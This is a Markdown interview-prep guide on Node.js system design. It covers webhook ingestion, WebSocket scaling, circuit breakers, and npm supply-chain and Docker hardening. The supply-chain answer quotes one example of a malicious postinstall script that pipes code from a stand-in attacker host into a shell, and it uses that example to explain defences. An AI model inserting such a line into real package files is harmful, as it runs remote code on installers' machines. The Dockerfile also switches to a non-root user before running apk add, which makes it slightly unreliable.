# 16 — Enterprise System Design & Production Hardening

> Full-Stack Backend System Design using the RADIO Framework: High-Throughput Webhook Ingestion, 100k Concurrent WebSocket Gateway, Circuit Breakers & Supply Chain Defense.

---

## 📑 Table of Contents
1. [RADIO System Design Framework Overview](#1-radio-system-design-framework-overview)
2. [Scenario 1: High-Throughput Webhook Ingestion Engine (50k req/s)](#2-scenario-1-high-throughput-webhook-ingestion-engine-50k-reqs)
3. [Scenario 2: Real-Time Broadcast Gateway (100k Concurrent Sockets)](#3-scenario-2-real-time-broadcast-gateway-100k-concurrent-sockets)
4. [Scenario 3: Resilient Microservice Client with Circuit Breakers](#4-scenario-3-resilient-microservice-client-with-circuit-breakers)
5. [Supply Chain Security, Lockfiles & Container Hardening](#5-supply-chain-security-lockfiles--container-hardening)
6. [🎯 Quick-Fire & Trap Questions](#6--quick-fire--trap-questions)

---

## 1. RADIO System Design Framework Overview

Every system design question in this guide adheres to the **RADIO Framework**:

```text
┌────────────────────────────────────────────────────────┐
│ R - Requirements Clarification (Functional & Non-Func) │
│ A - Architecture & High-Level Component Topology       │
│ D - Data Model & Storage Schema                        │
│ I - Interface & API Contract Design                    │
│ O - Optimizations, Resilience, Edge Cases & Security   │
└────────────────────────────────────────────────────────┘
```

---

## 2. Scenario 1: High-Throughput Webhook Ingestion Engine (50k req/s)

### Q1: Architect a high-throughput webhook ingestion system in Node.js processing 50,000 webhooks/sec with 99.99% durability and idempotency.
**Difficulty:** 🟣 Principal / Lead  
**Type:** 🏗️ Architecture / System Design  
**Tags:** `[SystemDesign]` `[RADIO]` `[Fastify]` `[Kafka]` `[BullMQ]`

**Answer:**

#### 1. R — Requirements Clarification:
- **Functional Requirements:**
  - Ingest webhooks from Stripe, Shopify, GitHub at `POST /v1/webhooks/:provider`.
  - Authenticate webhooks via HMAC-SHA256 signature verification.
  - Guarantee at-least-once delivery with deduplication (idempotency).
- **Non-Functional Requirements:**
  - Throughput: 50,000 requests/second at peak.
  - Ingestion Latency: Return `202 Accepted` to providers in $< 50\text{ms}$.
  - Durability: Zero webhook loss during database outages.

#### 2. A — Architecture & High-Level Topology:
```text
Third-Party Providers (Stripe, GitHub)
            │
            ▼ (50,000 req/s)
[ Cloudflare / AWS ALB (Rate Limiting & TLS Termination) ]
            │
            ▼
┌─────────────────────────────────────────────────────────┐
│           Fastify Ingestion Tier (Stateless)            │
│  - Verifies HMAC signature via timingSafeEqual          │
│  - Returns 202 Accepted immediately (<20ms)             │
└───────────────────────────┬─────────────────────────────┘
                            │ (Asynchronous Push)
                            ▼
┌─────────────────────────────────────────────────────────┐
│        Distributed Log Buffer (Apache Kafka / Redis)    │
│  - Partitioned by Provider + Tenant ID                  │
└───────────────────────────┬─────────────────────────────┘
                            │ (Consumer Pull)
                            ▼
┌─────────────────────────────────────────────────────────┐
│           Node.js Worker Pool (BullMQ Workers)          │
│  - Checks Redis Idempotency Key (SET NX EX)             │
│  - Executes business logic                              │
│  - Persists to PostgreSQL with Dead Letter Queue (DLQ)  │
└─────────────────────────────────────────────────────────┘
```

#### 3. D — Data Model & Storage Schema:
```sql
CREATE TABLE webhook_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  idempotency_key VARCHAR(255) NOT NULL UNIQUE,
  provider VARCHAR(50) NOT NULL,
  payload JSONB NOT NULL,
  status VARCHAR(20) DEFAULT 'PENDING', -- PENDING, PROCESSED, FAILED
  attempts INT DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  processed_at TIMESTAMPTZ
);
CREATE INDEX idx_webhooks_idempotency ON webhook_events(idempotency_key);
```

#### 4. I — Interface & API Contract:
`POST /v1/webhooks/:provider`
Headers:
- `X-Signature: sha256=a7b8c...`
- `Idempotency-Key: evt_stripe_123`

```typescript
// Fastify Ingestion Controller
fastify.post('/v1/webhooks/:provider', async (req, reply) => {
  const { provider } = req.params;
  const signature = req.headers['x-signature'];
  const rawBody = req.rawBody; // Captured unparsed for signature check

  if (!verifyHmacSignature(rawBody, signature, secret)) {
    return reply.status(401).send({ error: 'Invalid HMAC signature' });
  }

  // Push to high-speed stream; do NOT write to slow database synchronously!
  await kafkaProducer.send({
    topic: 'webhook-ingestion',
    messages: [{ key: req.headers['idempotency-key'], value: rawBody }],
  });

  return reply.status(202).send({ status: 'Accepted' });
});
```

#### 5. O — Optimizations & Resiliency:
- **HMAC Verification Optimization:** Use `crypto.createHmac()` with raw unparsed `Buffer` before body parsing.
- **Idempotency Defense:** In workers, execute Redis `SET idempotency:evt_123 "locked" NX EX 86400`. If `0` is returned, drop the duplicate event immediately.
- **Backpressure Handling:** If Kafka is overloaded, the Fastify ingestion nodes pause their read stream to prevent memory exhaustion.

---

## 3. Scenario 2: Real-Time Broadcast Gateway (100k Concurrent Sockets)

### Q2: Design a real-time notification gateway handling 100,000 concurrent WebSocket connections across horizontally scaled Node.js instances.
**Difficulty:** 🟣 Principal / Lead  
**Type:** 🏗️ Architecture / System Design  
**Tags:** `[SystemDesign]` `[WebSockets]` `[Scaling]` `[Redis]`

**Answer:**

#### 1. R — Requirements Clarification:
- **Scale:** 100,000 simultaneously connected users.
- **Latency:** Broadcast notification to targeted users within $< 50\text{ms}$.
- **Node Memory Budget:** Max 1GB RAM per container instance.

#### 2. A — High-Level Architecture:
A single Node.js process can easily maintain 20,000–30,000 idle TCP sockets if configured correctly. To support 100,000 connections with headroom, we deploy a cluster of **5 to 8 Node.js instances**:

```text
                        100,000 Client WebSockets
                                   │
                                   ▼
             [ AWS Network Load Balancer (NLB - Layer 4) ]
                                   │
         ┌─────────────────────────┼─────────────────────────┐
         ▼                         ▼                         ▼
┌───────────────────┐     ┌───────────────────┐     ┌───────────────────┐
│ Node Socket Pod 1 │     │ Node Socket Pod 2 │     │ Node Socket Pod 3 │
│  (15k Sockets)    │     │  (15k Sockets)    │     │  (15k Sockets)    │
└─────────▲─────────┘     └─────────▲─────────┘     └─────────▲─────────┘
          │                         │                         │
          └─────────────────────────┼─────────────────────────┘
                                    │
                                    ▼
                [ Redis Streams / Redis Pub/Sub Backplane ]
                                    ▲
                                    │
                    [ Notification Trigger Service ]
```

#### 3. D — Data Model & In-Memory Socket Map:
Each node maintains a local connection registry:
```typescript
// Map user ID to Set of active local WebSocket instances (for multi-tab users)
const localConnections = new Map<string, Set<WebSocket>>();
```

#### 4. I — Interface & Redis Broadcast Contract:
When a notification is generated:
```typescript
// Publisher pushes event to Redis Pub/Sub:
await redisPublisher.publish('notifications', JSON.stringify({
  targetUserId: 'user-789',
  payload: { title: 'Order Shipped', orderId: 'ord-456' }
}));

// Every Node instance subscribes to the Redis channel:
redisSubscriber.on('message', (channel, message) => {
  const { targetUserId, payload } = JSON.parse(message);
  const userSockets = localConnections.get(targetUserId);

  if (userSockets) {
    const frame = JSON.stringify(payload);
    for (const ws of userSockets) {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(frame);
      }
    }
  }
});
```

#### 5. O — Optimizations & Disaster Scenarios:
1. **OS File Descriptor Limits:** Increase Linux limits (`nofile 65535` in `/etc/security/limits.conf`).
2. **Preventing Reconnection Thundering Herd:** When a Node instance restarts, 15,000 clients attempt to reconnect simultaneously. Enforce **Exponential Backoff with Full Jitter** on the frontend client:
   $$\text{reconnectDelay} = \text{random}(0, \min(\text{maxDelay}, \text{base} \times 2^{\text{attempt}}))$$
3. **Heartbeat Jitter:** Stagger periodic ping/pong timers across sockets to avoid synchronous timer spikes.

---

## 4. Scenario 3: Resilient Microservice Client with Circuit Breakers

### Q5: How do you design a resilient HTTP client in Node.js using Circuit Breakers, Exponential Backoff, and Jitter?
**Difficulty:** 🔴 Senior  
**Type:** 💻 Practical / Coding  
**Tags:** `[Resilience]` `[CircuitBreaker]` `[Cockatiel]`

**Answer:**

```text
          [ Request Arrives ]
                   │
                   ▼
       ┌───────────────────────┐
       │     CLOSED STATE      │ ──(Consecutive Failures > 50%)──► ┌──────────────────────┐
       │ (Normal Operation)    │                                   │      OPEN STATE      │
       └───────────────────────┘                                   │ (Fails Fast; 0 Calls)│
                   ▲                                               └──────────┬───────────┘
                   │                                                          │
       (Trial Successes)                                              (Sleep Window: 30s)
                   │                                                          │
                   │               ┌───────────────────────┐                  │
                   └───────────────┤    HALF-OPEN STATE    │ ◄────────────────┘
                                   │ (Allows Trial Request)│
                                   └───────────────────────┘
```

#### Implementation with Cockatiel:
```typescript
import {
  circuitBreaker,
  retry,
  handleWhenResult,
  ExponentialBackoff,
  wrap,
} from 'cockatiel';

// 1. Retry Policy: Max 3 retries with exponential backoff and jitter
const retryPolicy = retry(handleWhenResult((res: Response) => res.status >= 500), {
  maxAttempts: 3,
  backoff: new ExponentialBackoff({
    initialDelay: 200,
    maxDelay: 2000,
  }),
});

// 2. Circuit Breaker Policy: Breaks if 50% of requests fail over 10-second sample
const breakerPolicy = circuitBreaker(handleWhenResult((res: Response) => res.status >= 500), {
  halfOpenAfter: 30000, // Stay Open for 30 seconds before testing recovery
  breaker: {
    threshold: 0.5,
    samplingDuration: 10000,
    minimumRps: 5,
  },
});

// Wrap policies: Retry runs inside Circuit Breaker
const resilientPipeline = wrap(breakerPolicy, retryPolicy);

export async function callPaymentGateway(orderId: string): Promise<PaymentResponse> {
  return await resilientPipeline.execute(async () => {
    const res = await fetch(`https://payment.external/charges/${orderId}`, {
      signal: AbortSignal.timeout(3000), // 3s per-attempt timeout
    });
    if (!res.ok) throw new Error(`Gateway returned HTTP ${res.status}`);
    return res.json();
  });
}
```

---

## 5. Supply Chain Security, Lockfiles & Container Hardening

### Q4: How do you protect an enterprise Node.js repository against malicious npm supply chain attacks and harden production Docker images?
**Difficulty:** 🔴 Senior  
**Type:** 🏗️ Architecture / Security  
**Tags:** `[Security]` `[SupplyChain]` `[Docker]`

**Answer:**

#### 1. Neutralizing Malicious Post-Install Scripts:
Attackers compromise npm packages and add `"postinstall": "curl http://evil.com/steal | sh"`.
- Configure `.npmrc`: `ignore-scripts=true`.
- In CI/CD: Run `npm ci --ignore-scripts`.

#### 2. Lockfile Integrity:
Never run `npm install` in CI/CD pipelines! Always use **`npm ci`** or **`pnpm install --frozen-lockfile`**, which verifies the SHA-512 subresource integrity hashes in `package-lock.json`.

#### 3. Production Hardened Multi-Stage Dockerfile:
```dockerfile
# Stage 1: Build & Prune
FROM node:22-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --ignore-scripts
COPY . .
RUN npm run build
RUN npm prune --production

# Stage 2: Hardened Runtime Container
FROM node:22-alpine AS runner
WORKDIR /app

# Run as dedicated non-root user (USER node has UID 1000)
USER node

# Copy compiled artifacts only
COPY --chown=node:node --from=builder /app/package*.json ./
COPY --chown=node:node --from=builder /app/node_modules ./node_modules
COPY --chown=node:node --from=builder /app/dist ./dist

# Use dumb-init to handle PID 1 signal forwarding (SIGTERM)
RUN apk add --no-cache dumb-init
ENTRYPOINT ["/usr/bin/dumb-init", "--"]

ENV NODE_ENV=production
EXPOSE 3000

CMD ["node", "dist/server.js"]
```

---

## 6. 🎯 Quick-Fire & Trap Questions

### Q5: Why is `dumb-init` or `tini` necessary as PID 1 in Node.js Docker containers?
**Difficulty:** 🟡 Mid  
**Type:** 📖 Conceptual  
**Tags:** `[Docker]` `[Linux]` `[Signals]`

**Answer:**
In Linux, the process running with **PID 1** does not receive default signal handling behavior. If Node.js runs as PID 1 directly, it ignores `SIGTERM` signals sent by `docker stop` or Kubernetes pod evictions. The container hangs for 10–30 seconds until the OS kernel forcefully terminates it with `SIGKILL`, dropping in-flight requests. An init system like `dumb-init` assumes PID 1, properly forwards `SIGTERM` to the Node process, and reaps orphaned zombie child processes.

---

### Q6: What is Typosquatting in npm, and how do you protect corporate builds?
**Difficulty:** 🟢 Junior  
**Type:** 📖 Conceptual  
**Tags:** `[Security]` `[npm]`

**Answer:**
An attacker publishes a malicious package with a name subtly misspelled from a popular library (e.g., `cross-env` vs `crossenv`, `colors` vs `colour`). Developers mistyping a package name accidentally install the malicious library. Protection includes using private scoped enterprise registries (`@myorg/*`), automated SCA security scanners (Socket.dev, Snyk), and checking lockfiles into Git.
